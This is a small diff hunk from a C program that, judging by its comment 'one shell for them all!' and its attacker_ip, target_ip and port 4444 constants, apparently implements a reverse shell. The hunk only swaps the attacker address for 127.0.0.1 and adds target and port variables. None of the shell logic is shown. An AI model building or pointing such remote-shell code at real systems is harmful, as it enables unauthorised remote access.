@@ -8,7 +8,9 @@
 #include <sys/types.h>  //im game: one shell for them all!
 #include <sys/wait.h>
 
-const char* attacker_ip = "100.66.181.0";
+const char* attacker_ip = "127.0.0.1"; //TODO: make dynamic
+const char* target_ip = "1.0.0.1"; //TODO: make dynamic
+const char* attacker_port = "4444";
 int port = 4444;
 
 int main() {
